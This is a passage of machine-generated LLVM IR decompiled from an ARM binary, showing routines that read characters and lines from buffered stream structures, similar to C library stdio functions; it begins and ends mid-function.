  %v2_15178 = load i16, i16* %v1_15178, align 2
  %v3_15178 = zext i16 %v2_15178 to i32
  %v1_1517c = and i32 %v3_15178, 64
  store i32 %v1_1517c, i32* %r3.global-to-local, align 4
  %v2_1517c = icmp eq i32 %v1_1517c, 0
  br i1 %v2_1517c, label %bb51, label %dec_label_pc_15188

bb51:                                             ; preds = %dec_label_pc_15178
  br label %bb52

dec_label_pc_15188:                               ; preds = %dec_label_pc_15178
  %v1_15188 = call i32 @function_14c84(i32 %v0_15188)
  store i32 %v1_15188, i32* %r0.global-to-local, align 4
  %v2_1518c = icmp eq i32 %v1_15188, 0
  br i1 %v2_1518c, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_15188
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_15188
  %v1_15190 = load i32, i32* %fp.global-to-local, align 4
  %v2_15190 = inttoptr i32 %v1_15190 to i16*
  %v3_15190 = load i16, i16* %v2_15190, align 2
  %v4_15190 = zext i16 %v3_15190 to i32
  store i32 %v4_15190, i32* %r3.global-to-local, align 4
  %v2_15194 = add i32 %v1_15190, 8
  %v3_15194 = inttoptr i32 %v2_15194 to i32*
  %v4_15194 = load i32, i32* %v3_15194, align 4
  store i32 %v4_15194, i32* %r2.global-to-local, align 4
  %v2_15198 = and i32 %v4_15190, 65471
  store i32 %v2_15198, i32* %r3.global-to-local, align 4
  %v2_1519c = trunc i32 %v2_15198 to i16
  store i16 %v2_1519c, i16* %v2_15190, align 2
  %v1_151a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_151a0 = load i32, i32* %fp.global-to-local, align 4
  %v3_151a0 = add i32 %v2_151a0, 28
  %v4_151a0 = inttoptr i32 %v3_151a0 to i32*
  store i32 %v1_151a0, i32* %v4_151a0, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_15170, %.thread24
  %v0_151ac = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_151ac.pre, %dec_label_pc_15170 ], [ 0, %.thread24 ]
  store i32 %v0_151ac, i32* %r0.global-to-local, align 4
  %v2_151b4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_151b4, i32* %r4.global-to-local, align 4
  ret i32 %v0_151ac

; uselistorder directives
  uselistorder i32 %v0_151ac, { 1, 0 }
  uselistorder i32 %v3_15164, { 1, 2, 0 }
  uselistorder i32 %v0_15114, { 1, 0, 2 }
  uselistorder i32 %v0_15054, { 1, 0, 2 }
  uselistorder i32 %v0_15188, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 16, 7, 9, 8, 10, 12, 11, 13, 14, 15, 2, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_14e4c, { 1, 0 }
  uselistorder i32 56, { 8, 9, 10, 1, 2, 11, 13, 4, 5, 6, 7, 0, 3, 12, 14 }
  uselistorder i32* @r8, { 7, 8, 9, 10, 11, 12, 13, 14, 1, 15, 200, 150, 151, 2, 152, 153, 154, 178, 179, 180, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 59, 60, 61, 62, 63, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 16, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 3, 56, 57, 58, 64, 65, 66, 67, 68, 69, 70, 71, 72, 78, 4, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 5, 146, 147, 148, 149, 191, 192, 0, 193, 194, 195, 196, 197, 198, 199, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 73, 74, 75, 76, 77 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11 }
  uselistorder i32* inttoptr (i32 124892 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9 }
  uselistorder i32 72, { 0, 1, 2, 3, 4, 5, 15, 11, 12, 13, 14, 6, 16, 7, 8, 9, 10 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_15164, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_150dc, { 1, 0 }
  uselistorder label %dec_label_pc_15010, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_151c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_151c0:
  %v0_151c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_151c0, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_151c0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_151c0, %bb
  %v5_151dc = phi i32 [ %arg1, %dec_label_pc_151c0 ], [ 0, %bb ]
  ret i32 %v5_151dc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_151e0(i16* %arg1) local_unnamed_addr {
dec_label_pc_151e0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_151e0 = load i32, i32* @r4, align 4
  store i32 %v3_151e0, i32* %stack_var_-12, align 4
  %v6_151e0 = load i32, i32* @r5, align 4
  %v9_151e0 = load i32, i32* @lr, align 4
  %v0_151e4 = load i32, i32* @r0, align 4
  %v1_151e4 = add i32 %v0_151e4, 16
  %v2_151e4 = inttoptr i32 %v1_151e4 to i32*
  %v3_151e4 = load i32, i32* %v2_151e4, align 4
  store i32 %v3_151e4, i32* %r2.global-to-local, align 4
  %v1_151e8 = add i32 %v0_151e4, 24
  %v2_151e8 = inttoptr i32 %v1_151e8 to i32*
  %v3_151e8 = load i32, i32* %v2_151e8, align 4
  %v3_151ec = icmp ult i32 %v3_151e4, %v3_151e8
  store i32 %v0_151e4, i32* @r4, align 4
  br i1 %v3_151ec, label %bb, label %dec_label_pc_1520c

bb:                                               ; preds = %dec_label_pc_151e0
  %v2_151f8 = inttoptr i32 %v3_151e4 to i8*
  %v3_151f8 = load i8, i8* %v2_151f8, align 1
  %v4_151f8 = zext i8 %v3_151f8 to i32
  store i32 %v4_151f8, i32* %r0.global-to-local, align 4
  %v6_151f8 = add i32 %v3_151e4, 1
  store i32 %v6_151f8, i32* %r2.global-to-local, align 4
  store i32 %v6_151f8, i32* %v2_151e4, align 4
  br label %dec_label_pc_152f8

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151e0
  store i32 124820, i32* @r5, align 4
  %v1_1520c = inttoptr i32 %v0_151e4 to i16*
  %v2_1520c = load i16, i16* %v1_1520c, align 2
  %v3_1520c = zext i16 %v2_1520c to i32
  %v1_15210 = and i32 %v3_1520c, 131
  %tmp24 = icmp ugt i32 %v1_15210, 128
  br i1 %tmp24, label %dec_label_pc_1522c, label %dec_label_pc_1521c

dec_label_pc_1521c:                               ; preds = %dec_label_pc_1520c
  store i32 128, i32* @r1, align 4
  %v0_15220 = call i32 @function_1604c()
  store i32 %v0_15220, i32* %r0.global-to-local, align 4
  %v2_15224 = icmp eq i32 %v0_15220, 0
  br i1 %v2_15224, label %dec_label_pc_1521c.dec_label_pc_1522c_crit_edge, label %dec_label_pc_152f4

dec_label_pc_1521c.dec_label_pc_1522c_crit_edge:  ; preds = %dec_label_pc_1521c
  %v0_1522c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1522c

dec_label_pc_1522c:                               ; preds = %dec_label_pc_1521c.dec_label_pc_1522c_crit_edge, %dec_label_pc_1520c
  %v2_1526c = phi i32 [ %v0_1522c.pre, %dec_label_pc_1521c.dec_label_pc_1522c_crit_edge ], [ %v0_151e4, %dec_label_pc_1520c ]
  %v1_1522c = inttoptr i32 %v2_1526c to i16*
  %v2_1522c = load i16, i16* %v1_1522c, align 2
  %v3_1522c = zext i16 %v2_1522c to i32
  store i32 %v3_1522c, i32* %r2.global-to-local, align 4
  %v1_15230 = and i32 %v3_1522c, 2
  %v2_15230 = icmp eq i32 %v1_15230, 0
  br i1 %v2_15230, label %dec_label_pc_1525c, label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %dec_label_pc_1522c
  %tmp25 = urem i16 %v2_1522c, 2
  %v1_15238 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_15238
  %v4_1523c = and i32 %tmp21, 4
  %v5_1523c = add i32 %v4_1523c, %v2_1526c
  %v1_15240 = add i32 %v5_1523c, 36
  %v2_15240 = inttoptr i32 %v1_15240 to i8*
  %v3_15240 = load i8, i8* %v2_15240, align 1
  %v4_15240 = zext i8 %v3_15240 to i32
  %v1_15244 = add nsw i32 %v3_1522c, -1
  store i32 %v1_15244, i32* %r2.global-to-local, align 4
  store i32 %v4_15240, i32* %r0.global-to-local, align 4
  %v2_15250 = add i32 %v2_1526c, 40
  %v3_15250 = inttoptr i32 %v2_15250 to i32*
  store i32 0, i32* %v3_15250, align 4
  %v0_15254 = load i32, i32* %r2.global-to-local, align 4
  %v1_15254 = trunc i32 %v0_15254 to i16
  %v2_15254 = load i32, i32* @r4, align 4
  %v3_15254 = inttoptr i32 %v2_15254 to i16*
  store i16 %v1_15254, i16* %v3_15254, align 2
  br label %dec_label_pc_152f8

dec_label_pc_1525c:                               ; preds = %dec_label_pc_1522c
  %v1_1525c = add i32 %v2_1526c, 16
  %v1_15260 = inttoptr i32 %v1_1525c to i32*
  %v2_15260 = load i32, i32* %v1_15260, align 4
  %v3_15260 = add i32 %v2_1526c, 20
  %v4_15260 = inttoptr i32 %v3_15260 to i32*
  %v5_15260 = load i32, i32* %v4_15260, align 4
  %v9_15264 = icmp eq i32 %v5_15260, %v2_15260
  br i1 %v9_15264, label %dec_label_pc_15274, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1525c
  %v2_15268 = inttoptr i32 %v2_15260 to i8*
  %v3_15268 = load i8, i8* %v2_15268, align 1
  %v4_15268 = zext i8 %v3_15268 to i32
  store i32 %v4_15268, i32* %r0.global-to-local, align 4
  %v6_15268 = add i32 %v2_15260, 1
  store i32 %v6_15268, i32* %v1_15260, align 4
  br label %dec_label_pc_152f8

dec_label_pc_15274:                               ; preds = %dec_label_pc_1525c
  %v1_15274 = add i32 %v2_1526c, 4
  %v2_15274 = inttoptr i32 %v1_15274 to i32*
  %v3_15274 = load i32, i32* %v2_15274, align 4
  %v7_15278 = icmp eq i32 %v3_15274, -2
  br i1 %v7_15278, label %.thread8, label %dec_label_pc_1528c

.thread8:                                         ; preds = %dec_label_pc_15274
  %v2_1527c = or i16 %v2_1522c, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_1527c, i16* %v1_1522c, align 2
  br label %dec_label_pc_152f8

dec_label_pc_1528c:                               ; preds = %dec_label_pc_15274
  %v1_1528c = and i32 %v3_1522c, 768
  %v2_1528c = icmp eq i32 %v1_1528c, 0
  br i1 %v2_1528c, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_1528c
  %v1_15294 = load i32, i32* @r5, align 4
  %v3_15294 = add i32 %v1_15294, 44
  %v4_15294 = inttoptr i32 %v3_15294 to i32*
  %v5_15294 = load i32, i32* %v4_15294, align 4
  store i32 %v5_15294, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1528c, %bb22
  %v1_15298 = xor i1 %v2_1528c, true
  call void @__pseudo_cond_branch(i1 %v1_15298, i32 ptrtoint (i32* @global_var_14fd4.506 to i32))
  %v0_1529c = load i32, i32* @r4, align 4
  %v1_1529c = add i32 %v0_1529c, 8
  store i32 %v1_1529c, i32* %r2.global-to-local, align 4
  %v1_152a0 = inttoptr i32 %v1_1529c to i32*
  %v2_152a0 = load i32, i32* %v1_152a0, align 4
  store i32 %v2_152a0, i32* %r2.global-to-local, align 4
  %v3_152a0 = add i32 %v0_1529c, 12
  %v4_152a0 = inttoptr i32 %v3_152a0 to i32*
  %v5_152a0 = load i32, i32* %v4_152a0, align 4
  %v9_152a4 = icmp eq i32 %v5_152a0, %v2_152a0
  br i1 %v9_152a4, label %dec_label_pc_152d8, label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %.thread10
  %v2_152ac = add i32 %v0_1529c, 24
  %v3_152ac = inttoptr i32 %v2_152ac to i32*
  store i32 %v2_152a0, i32* %v3_152ac, align 4
  %v0_152b0 = load i32, i32* @r4, align 4
  store i32 %v0_152b0, i32* %r0.global-to-local, align 4
  %v2_152b4 = call i32 @function_1601c(i32 %v0_152b0)
  store i32 %v2_152b4, i32* %r0.global-to-local, align 4
  %v2_152b8 = icmp eq i32 %v2_152b4, 0
  br i1 %v2_152b8, label %dec_label_pc_152f4, label %dec_label_pc_152c0

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152ac
  %v0_152c0 = load i32, i32* @r4, align 4
  %v1_152c0 = add i32 %v0_152c0, 20
  %v2_152c0 = inttoptr i32 %v1_152c0 to i32*
  %v3_152c0 = load i32, i32* %v2_152c0, align 4
  %v2_152c4 = add i32 %v0_152c0, 24
  %v3_152c4 = inttoptr i32 %v2_152c4 to i32*
  store i32 %v3_152c0, i32* %v3_152c4, align 4
  %v0_152c8 = load i32, i32* @r4, align 4
  %v1_152c8 = add i32 %v0_152c8, 16
  %v2_152c8 = inttoptr i32 %v1_152c8 to i32*
  %v3_152c8 = load i32, i32* %v2_152c8, align 4
  %v1_152cc = inttoptr i32 %v3_152c8 to i8*
  %v2_152cc = load i8, i8* %v1_152cc, align 1
  %v3_152cc = zext i8 %v2_152cc to i32
  store i32 %v3_152cc, i32* %r0.global-to-local, align 4
  %v5_152cc = add i32 %v3_152c8, 1
  store i32 %v5_152cc, i32* %v2_152c8, align 4
  br label %dec_label_pc_152f8

dec_label_pc_152d8:                               ; preds = %.thread10
  %v1_152d8 = inttoptr i32 %v0_1529c to i16*
  store i32 %v0_1529c, i32* %r0.global-to-local, align 4
  %v2_152dc = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_152e4 = call i32 @function_15f10(i16* %v1_152d8, i32 %v2_152dc, i32 1)
  store i32 %v5_152e4, i32* %r0.global-to-local, align 4
  %v2_152e8 = icmp eq i32 %v5_152e4, 0
  br i1 %v2_152e8, label %dec_label_pc_152f4, label %bb23

bb23:                                             ; preds = %dec_label_pc_152d8
  %v4_152ec = load i8, i8* %stack_var_-17, align 1
  %v5_152ec = sext i8 %v4_152ec to i32
  store i32 %v5_152ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152f8

dec_label_pc_152f4:                               ; preds = %dec_label_pc_152d8, %dec_label_pc_1521c, %dec_label_pc_152ac
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152f8

dec_label_pc_152f8:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_152c0, %dec_label_pc_15238, %dec_label_pc_152f4
  %v2_152fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_152fc, i32* @r4, align 4
  store i32 %v6_151e0, i32* @r5, align 4
  store i32 %v9_151e0, i32* @lr, align 4
  %v1_15300 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15300

; uselistorder directives
  uselistorder i32 %v2_15260, { 1, 0, 2 }
  uselistorder i32 %v2_1526c, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_151e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_151e4, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 1, 0, 4, 3, 2, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i32 128, { 5, 0, 4, 6, 1, 7, 8, 9, 2, 3, 10, 11, 12 }
  uselistorder label %dec_label_pc_152f8, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_152f4, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_1530c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1530c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_1530c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15310 = icmp eq i32 %arg2, 0
  store i1 %v2_15310, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_15398, label %dec_label_pc_15380.preheader

dec_label_pc_15380.preheader:                     ; preds = %dec_label_pc_1530c
  store i32 %tmp, i32* @r5, align 4
  %v1_153802 = add i32 %arg2, -1
  store i32 %v1_153802, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_153808 = icmp eq i32 %arg2, 1
  store i1 %v7_153808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_153808, label %dec_label_pc_15388, label %dec_label_pc_1532c

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15380.preheader, %dec_label_pc_15380.backedge.dec_label_pc_1532c_crit_edge
  %v0_15350 = phi i32 [ %v0_1532c.pre, %dec_label_pc_15380.backedge.dec_label_pc_1532c_crit_edge ], [ %arg3, %dec_label_pc_15380.preheader ]
  %v1_1532c = add i32 %v0_15350, 16
  %v2_1532c = inttoptr i32 %v1_1532c to i32*
  %v3_1532c = load i32, i32* %v2_1532c, align 4
  store i32 %v3_1532c, i32* %r2.global-to-local, align 4
  %v1_15330 = add i32 %v0_15350, 24
  %v2_15330 = inttoptr i32 %v1_15330 to i32*
  %v3_15330 = load i32, i32* %v2_15330, align 4
  store i32 %v3_15330, i32* %r3.global-to-local, align 4
  %v3_15334 = icmp uge i32 %v3_1532c, %v3_15330
  store i1 %v3_15334, i1* %cpsr_c.global-to-local, align 1
  %v9_15334 = icmp eq i32 %v3_1532c, %v3_15330
  store i1 %v9_15334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15334, label %dec_label_pc_15350, label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_1532c
  %v1_1533c = inttoptr i32 %v3_1532c to i8*
  %v2_1533c = load i8, i8* %v1_1533c, align 1
  %v3_1533c = zext i8 %v2_1533c to i32
  store i32 %v3_1533c, i32* %r3.global-to-local, align 4
  %v5_1533c = add i32 %v3_1532c, 1
  store i32 %v5_1533c, i32* %r2.global-to-local, align 4
  %v2_15340 = load i32, i32* @r5, align 4
  %v3_15340 = inttoptr i32 %v2_15340 to i8*
  store i8 %v2_1533c, i8* %v3_15340, align 1
  %v4_15340 = load i32, i32* @r5, align 4
  %v5_15340 = add i32 %v4_15340, 1
  store i32 %v5_15340, i32* @r5, align 4
  %v0_15344 = load i32, i32* %r3.global-to-local, align 4
  %v2_15344 = icmp ugt i32 %v0_15344, 9
  store i1 %v2_15344, i1* %cpsr_c.global-to-local, align 1
  %v7_15344 = icmp eq i32 %v0_15344, 10
  store i1 %v7_15344, i1* %cpsr_z.global-to-local, align 1
  %v0_15348 = load i32, i32* %r2.global-to-local, align 4
  %v1_15348 = load i32, i32* @r4, align 4
  %v2_15348 = add i32 %v1_15348, 16
  %v3_15348 = inttoptr i32 %v2_15348 to i32*
  store i32 %v0_15348, i32* %v3_15348, align 4
  br i1 %v7_15344, label %dec_label_pc_15388, label %dec_label_pc_15380.backedge

dec_label_pc_15350:                               ; preds = %dec_label_pc_1532c
  %v1_15350 = inttoptr i32 %v0_15350 to i16*
  %v3_15354 = call i32 @function_151e0(i16* %v1_15350)
  %v3_15358 = icmp eq i32 %v3_15354, -1
  store i1 %v3_15358, i1* %cpsr_c.global-to-local, align 1
  %v8_15358 = icmp eq i32 %v3_15354, -1
  store i1 %v8_15358, i1* %cpsr_z.global-to-local, align 1
  %v1_1535c = urem i32 %v3_15354, 256
  store i32 %v1_1535c, i32* %r3.global-to-local, align 4
  br i1 %v3_15358, label %dec_label_pc_15364, label %dec_label_pc_1537c

dec_label_pc_15364:                               ; preds = %dec_label_pc_15350
  %v0_15364 = load i32, i32* @r4, align 4
  %v1_15364 = inttoptr i32 %v0_15364 to i16*
  %v2_15364 = load i16, i16* %v1_15364, align 2
  %v3_15364 = zext i16 %v2_15364 to i32
  store i32 %v3_15364, i32* %r3.global-to-local, align 4
  %v1_15368 = and i32 %v3_15364, 8
  %v2_15368 = icmp eq i32 %v1_15368, 0
  store i1 %v2_15368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15368, label %dec_label_pc_15388, label %dec_label_pc_15398

dec_label_pc_1537c:                               ; preds = %dec_label_pc_15350
  %v1_15374 = trunc i32 %v3_15354 to i8
  %v2_15374 = load i32, i32* @r5, align 4
  %v3_15374 = inttoptr i32 %v2_15374 to i8*
  store i8 %v1_15374, i8* %v3_15374, align 1
  %v4_15374 = load i32, i32* @r5, align 4
  %v5_15374 = add i32 %v4_15374, 1
  store i32 %v5_15374, i32* @r5, align 4
  %v0_15378 = load i32, i32* %r3.global-to-local, align 4
  %v2_15378 = icmp ugt i32 %v0_15378, 9
  store i1 %v2_15378, i1* %cpsr_c.global-to-local, align 1
  %v7_15378 = icmp eq i32 %v0_15378, 10
  store i1 %v7_15378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15378, label %dec_label_pc_15388, label %dec_label_pc_15380.backedge

dec_label_pc_15380.backedge:                      ; preds = %dec_label_pc_1537c, %dec_label_pc_1533c
  %v0_15380 = load i32, i32* %r6.global-to-local, align 4
  %v1_15380 = add i32 %v0_15380, -1
  store i32 %v1_15380, i32* %r6.global-to-local, align 4
  %v2_15380 = icmp ne i32 %v0_15380, 0
  store i1 %v2_15380, i1* %cpsr_c.global-to-local, align 1
  %v7_15380 = icmp eq i32 %v0_15380, 1
  store i1 %v7_15380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15380, label %dec_label_pc_15388, label %dec_label_pc_15380.backedge.dec_label_pc_1532c_crit_edge

dec_label_pc_15380.backedge.dec_label_pc_1532c_crit_edge: ; preds = %dec_label_pc_15380.backedge
  %v0_1532c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1532c

dec_label_pc_15388:                               ; preds = %dec_label_pc_1537c, %dec_label_pc_15380.backedge, %dec_label_pc_1533c, %dec_label_pc_15380.preheader, %dec_label_pc_15364
  %v0_15388 = load i32, i32* @r5, align 4
  %v1_15388 = load i32, i32* @r7, align 4
  %v3_15388 = icmp uge i32 %v0_15388, %v1_15388
  store i1 %v3_15388, i1* %cpsr_c.global-to-local, align 1
  %v9_15388 = icmp eq i32 %v0_15388, %v1_15388
  store i1 %v9_15388, i1* %cpsr_z.global-to-local, align 1
  %v2_1538c = xor i1 %v9_15388, true
  %v3_1538c = and i1 %v3_15388, %v2_1538c
  br i1 %v3_1538c, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_15388
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_15390 = inttoptr i32 %v0_15388 to i8*
  store i8 0, i8* %v7_15390, align 1
  %v0_15394.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_15394.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15388, %bb
  %v1_15394 = phi i1 [ %v1_15394.pre, %bb ], [ %v9_15388, %dec_label_pc_15388 ]
  %v0_15394 = phi i1 [ %v0_15394.pre, %bb ], [ %v3_15388, %dec_label_pc_15388 ]
  %v2_15394 = xor i1 %v1_15394, true
  %v3_15394 = and i1 %v0_15394, %v2_15394
  br i1 %v3_15394, label %.dec_label_pc_1539c_crit_edge, label %dec_label_pc_15398

.dec_label_pc_1539c_crit_edge:                    ; preds = %.thread14
  %v0_1539c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1539c

dec_label_pc_15398:                               ; preds = %dec_label_pc_1530c, %dec_label_pc_15364, %.thread14
  br label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %.dec_label_pc_1539c_crit_edge, %dec_label_pc_15398
  %v0_1539c = phi i32 [ %v0_1539c.pre, %.dec_label_pc_1539c_crit_edge ], [ 0, %dec_label_pc_15398 ]
  store i32 %v6_1530c, i32* @r5, align 4
  ret i32 %v0_1539c

; uselistorder directives
  uselistorder i1 %v9_15388, { 1, 0, 2 }
  uselistorder i32 %v1_15388, { 1, 0 }
  uselistorder i32 %v0_15388, { 0, 2, 1 }
  uselistorder i32 %v0_15380, { 2, 0, 1 }
  uselistorder i32 %v0_15378, { 1, 0 }
  uselistorder i32 %v3_15354, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15344, { 1, 0 }
  uselistorder i32 %v3_1532c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15350, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @function_151e0, { 0, 2, 3, 1 }
  uselistorder i1 true, { 0, 1, 69, 101, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 64, 28, 29, 30, 31, 32, 120, 62, 65, 71, 106, 74, 73, 33, 102, 87, 103, 104, 36, 105, 63, 72, 107, 108, 109, 110, 66, 111, 112, 113, 114, 115, 37, 38, 116, 117, 34, 35, 118, 119, 86, 85, 39, 40, 41, 121, 42, 43, 75, 76, 81, 77, 82, 78, 80, 122, 79, 84, 123, 44, 124, 45, 125, 88, 89, 126, 90, 91, 127, 92, 93, 46, 47, 128, 94, 95, 48, 49, 129, 96, 97, 50, 51, 130, 98, 99, 52, 53, 70, 131, 132, 83, 133, 54, 67, 55, 56, 68, 57, 58, 59, 60, 61, 100 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1539c, { 1, 0 }
  uselistorder label %dec_label_pc_15398, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15388, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1532c, { 1, 0 }
}

define i32 @function_153b0() local_unnamed_addr {
dec_label_pc_153b0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_153b0 = load i32, i32* @r1, align 4
  %v1_153b0 = load i32, i32* @r0, align 4
  %v2_153b0 = sub i32 %v0_153b0, %v1_153b0
  %v3_153b0 = icmp ult i32 %v0_153b0, %v1_153b0
  %v4_153b0 = xor i32 %v1_153b0, %v0_153b0
  %v5_153b0 = xor i32 %v2_153b0, %v0_153b0
  %v6_153b0 = and i32 %v5_153b0, %v4_153b0
  %v7_153b0 = icmp slt i32 %v6_153b0, 0
  store i1 %v7_153b0, i1* %cpsr_v.global-to-local, align 1
  %v8_153b0 = icmp slt i32 %v2_153b0, 0
  store i1 %v8_153b0, i1* %cpsr_n.global-to-local, align 1
  %v9_153b0 = icmp eq i32 %v0_153b0, %v1_153b0
  store i1 %v9_153b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_153b0, label %dec_label_pc_15604, label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153b0
  br i1 %v9_153b0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_153b8
  %merge = phi i32 [ %v0_153b0, %dec_label_pc_153b8 ], [ %v2_15698, %bb150 ], [ %v11_156b4, %bb153 ], [ %v7_156b4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_153b8
  %v5_153bc = inttoptr i32 %v1_153b0 to i8*
  store i8* %v5_153bc, i8** %stack_var_-8, align 4
  %v8_153bc = load i32, i32* @lr, align 4
  %v0_153c0 = load i32, i32* @r2, align 4
  %v2_153c0 = add i32 %v0_153c0, -4
  store i32 %v2_153c0, i32* %r2.global-to-local, align 4
